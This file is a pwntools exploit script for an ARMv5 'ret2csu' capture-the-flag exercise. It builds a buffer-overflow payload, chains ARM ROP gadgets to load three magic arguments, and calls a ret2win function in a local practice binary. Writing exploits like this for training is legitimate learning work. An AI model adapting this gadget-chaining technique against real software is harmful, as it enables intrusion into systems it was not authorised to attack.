#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabi"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2csu_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./ret2csu_armv5_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)

ARGS = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# (r2) iS - sections adresses
# (r2) pd @ 0x00010478 - .plt section
# ;-- ret2win:
# 0x00010498      00c68fe2       add ip, pc, 0, 12
RET2WIN = p32(0x10498)

# ropper --arch ARM --file ret2csu_armv5
# 0x00010474: pop {r3, pc};
# 0x0001062c: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
# 0x00010644: pop {r4, r5, r6, r7, r8, sb, sl, pc};
POP_R3 = p32(0x10474)
MOV_R2_R1_R0 = p32(0x1062c)
POP_R45678_SB_SL_PC = p32(0x10644)

payload  = padding
payload += POP_R45678_SB_SL_PC + 3*p32(0xa5) + ARGS + p32(0xa5) + POP_R3
payload += RET2WIN + MOV_R2_R1_R0

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
